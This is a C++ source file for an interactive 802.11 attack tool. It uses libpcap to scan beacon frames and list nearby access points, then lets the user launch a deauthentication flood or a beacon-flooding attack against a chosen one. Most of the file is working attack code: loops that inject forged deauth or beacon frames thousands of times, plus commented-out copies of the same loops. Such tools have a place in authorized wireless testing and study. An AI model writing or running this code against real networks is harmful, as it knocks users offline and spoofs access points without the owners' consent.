#include <pcap.h>
#include <stdlib.h>
#include "dot11.h"
#include "radiotap.h"
#include <set>
#include <string.h>
#include <vector>
#include <map>
#include <unistd.h>
#include <thread>
#include <time.h>


void usage(){

    printf("syntax: airodump <interface>\n");
    printf("sample: airodump wlan0\n");
}

void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls);
void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls);
void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size);


int main(int argc, char *argv[])
{

    //using namespace std;
    if(argc!=2){
        usage();
        return -1;
    }

   /* interface open */

    char* dev =argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return -1;
    }

    /* get packet */


    set<vector<uint8_t>> ap_list ;
    map<vector<uint8_t>,struct ap> ap_ls;
    vector<uint8_t> sel_mac;
    struct ap sel_ap;


    scan(handle,ap_list, ap_ls);


    /* Print AP list*/

    print_ap(ap_list,ap_ls);


    /* Select AP */



    int sel;
    printf("select AP Number : ");
    scanf("%d",&sel);





    int number=1;
    for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
        if(sel!=number++) continue;

        sel_mac=i->first;
        sel_ap=i->second;


       }

    printf("                               ");
    printf("------------------Select------------------\n");
    printf("                                            ");
    for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
    printf("%02x\n",sel_mac[5]);
    printf("                                         ");
    printf("ESSID:");
    for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
    printf("\n");



    int attack_nr;
    printf("                               ");
    printf("------------------Attack------------------\n");
    printf("                               ");
    printf("    [1] Deauth Attack & Checking \n");
    printf("                               ");
    printf("    [2] Beacon Flooding \n");
    printf("                               ");
    printf("------------------------------------------\n");
    printf("select Attack Number : ");
    scanf("%d",&attack_nr);

    switch (attack_nr) {

    case 1 : exe_deauth(handle,sel_mac,sel_ap);break;
    case 2 : exe_beacon(handle,sel_mac,sel_ap);break;

    }


/*
        uint8_t beacon1_size;
        uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
        uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
        uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);



        while(1){
         if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
         if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
         if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
         usleep(5000);

           }*/

/*
        bool attack_defense=false;
        bool scan_run=true;
        uint8_t deauth_size=0;
        uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);


        time_t start,end;
        start=time(NULL);
        thread attack = thread(thread_attack,handle,deauth,deauth_size);
        thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);

        attack.join();
        if((!attack.joinable())&&(scan.joinable())) scan_run=false;
        scan.join();
        end=time(NULL);

        system("clear");
        printf("                               ");
        printf("------------------Select------------------\n");
        printf("                                            ");
        for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
        printf("%02x\n",sel_mac[5]);
        printf("                                            ");
        printf("ESSID:");
        for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
        printf("\n");
        printf("                               ");
        printf("------------------Result------------------\n");
        printf("                                            ");
        printf("Total time : %f\n",(double)end-start);
        printf("                                            ");
        printf("Deauth defense : %d\n",attack_defense);
        printf("                               ");
        printf("------------------------------------------\n");
*/

/*
         for(int i=0;i<1000000;i++){
                     if(i%100==0) {
         if (pcap_sendpacket(handle, deauth, deauth_size) != 0) printf("\nsend packet Error \n");
         printf("send deauth packet %d\n", i);
         usleep(5000);
            }
        }
*/

}



void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls){



    int cnt=0;
    while(true){
        if(cnt==50) break;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);
        if(dot11->fc.type != 0 || dot11->fc.subtype!=0x08) continue;

        uint8_t *target = dot11->bssid;



       vector<uint8_t> temp;
       vector<uint8_t> name;
       for(int i=0;i<6;i++)
           temp.push_back(*(target+i));
       cnt++;
       if(!ap_list.insert(temp).second) {ap_ls.find(temp)->second.beacon++; continue;}


       struct ssid *size_ptr= (struct ssid *)(packet+rd->len+sizeof(struct dot11_header)+sizeof(struct beacon_fixed));

       uint8_t size = size_ptr->ssid_len;

       for(int i=0;i<size;i++){

                name.push_back(*((uint8_t *)(packet+rd->len+sizeof(dot11_header)+sizeof(struct beacon_fixed)+2+i)));
       }
       struct ap temp_ap;
       temp_ap.beacon=1;
       temp_ap.essid=name;
       temp_ap.pwr=-((~(*((uint8_t*)rd+22))+1)&0x000000FF);
       temp_ap.essid_len=size;
       //printf("%d\n",temp_ap.pwr);
       ap_ls.insert({temp,temp_ap});


    }
}

void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls){


    printf("      BSSID            PWR    Beacons  #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  \n");

    int num=1;
    for(auto i=ap_ls.begin();i!=ap_ls.end();i++)
           {
             printf("[%d] ",num++);

             for(int j=0;j<5;j++)
                 printf("%02x:",i->first[j]);
             printf("%02x",i->first[5]);
             printf("  %3d",i->second.pwr);
             printf("  %7d",i->second.beacon);
             printf("                                           ");
             for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
                  printf("%c",(*k));
             printf("\n");

           }
        printf("total AP : %ld\n",ap_list.size());

}

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel){

    uint8_t pk_cnt=0;
    sleep(5);
    printf("scan start\n");
    while(*run){
        printf("scanning\n");
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);

        uint8_t *target = dot11->dest;
       bool is_continue=false;
       for(int i=0;i<6;i++){
           if(target[i]!=sel[i]) {is_continue=true;break;}}
        if(is_continue)continue;
        if((dot11->fc.type!=1) || (dot11->fc.subtype!=11)) continue;

        /*
        printf("find!!\n");

        for(int i=0;i<6;i++)
            printf("%02x",*(target+i));
        printf("\n");

        int pk_size=rd->len + sizeof(dot11->fc)+sizeof(dot11->dest)+sizeof(dot11->duration)+sizeof(dot11->sour);
        for(int i=0;i<pk_size;i++)
            printf("%02x",*(packet+i));
        printf("\n");
        */

        if(++pk_cnt>5){*attack=true;break;}
    }
}

void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size){

    for(int i=0;i<1000000;i++){
             if(i%100==0) {
                 if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");
                 printf("send packet %d\n", i);
                 usleep(5000);
             }
       }
}

void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){





    bool attack_defense=false;
    bool scan_run=true;
    uint8_t deauth_size=0;
    uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);


    time_t start,end;
    start=time(NULL);
    thread attack = thread(thread_attack,handle,deauth,deauth_size);
    thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);

    attack.join();
    if((!attack.joinable())&&(scan.joinable())) scan_run=false;
    scan.join();
    end=time(NULL);

    system("clear");
    printf("                               ");
    printf("------------------Select------------------\n");
    printf("                                            ");
    for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
    printf("%02x\n",sel_mac[5]);
    printf("                                            ");
    printf("ESSID:");
    for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
    printf("\n");
    printf("                               ");
    printf("------------------Result------------------\n");
    printf("                                            ");
    printf("Total time : %f\n",(double)end-start);
    printf("                                            ");
    printf("Deauth defense : %d\n",attack_defense);
    printf("                               ");
    printf("------------------------------------------\n");
}
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
    uint8_t beacon1_size;
    uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
    uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
    uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);



    for(int i=0;i<1000000;i++){
     if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
     if(i%100000==0) printf("~Beacon Flooding~\n", i);
     usleep(5000);
    }
}
